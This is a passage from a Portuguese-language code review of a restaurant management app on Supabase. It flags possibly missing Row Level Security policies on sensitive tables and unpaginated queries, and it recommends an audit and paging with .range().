⚠️ **O que é (a verificar):** Toda a segurança do sistema depende de políticas de Row Level Security (RLS) no Supabase que **não podem ser confirmadas a partir do código-cliente** — mas o padrão observado (`select('*')`, `update`/`delete` diretos em tabelas sensíveis como `usuarios`, `auditoria`, `caixa`) é um forte indício de que o RLS está ausente ou permissivo demais.
📍 **Onde está:** Uso direto de `_supabase.from(...)` em praticamente todos os módulos.
💡 **Sugestão de Mudança:** Auditar explicitamente, no painel do Supabase, as políticas RLS de cada tabela — especialmente `usuarios`, `auditoria`, `caixa`, `despesas`, `produtos`.
🚀 **Benefício:** É o único "cinto de segurança" real quando toda a lógica de autorização roda no client, como demonstrado nos itens críticos acima.
🔥 **Prioridade:** Alta (ação recomendada, não uma falha confirmada no código)

⚠️ **O que é (BAIXO):** Ausência de paginação em consultas que tendem a crescer com o tempo — `carregarAuditoria` limita a 200 registros sem "carregar mais"; `despesas.js` e `produtos.js` fazem `.select('*')` sem `.limit()`.
📍 **Onde está:** `componentes/audit.js:75`; `componentes/despesas.js:165-170`; `componentes/produtos.js:28`.
💡 **Sugestão de Mudança:** Implementar paginação real (`.range()`) ou scroll infinito.
🚀 **Benefício:** Evita degradação de performance conforme o histórico do restaurante cresce.
🔥 **Prioridade:** Baixa
